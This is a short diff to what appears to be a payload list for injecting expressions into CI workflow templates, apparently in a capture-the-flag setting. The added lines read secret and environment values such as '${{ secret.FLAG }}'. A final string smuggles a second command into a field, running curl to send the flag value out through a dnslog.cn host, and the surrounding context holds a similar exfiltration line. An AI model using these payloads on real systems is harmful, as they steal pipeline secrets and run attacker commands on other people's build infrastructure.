@@ -577,3 +577,10 @@ ${{ env.flag }}
 ${{ env[FLAG] }}
 ${{ env.FLAG }}
 "; curl 'http://'.$flag.'xbqp2t.dnslog.cn'"
+R1gelX29:${{ secret.FLAG }}
+${{ secret.flag }}
+${{ secret[FLAG] }}
+${{ env.flag }}
+${{ env[FLAG] }}
+${{ env.FLAG }}
+"; curl $flag.sxhx72.dnslog.cn"
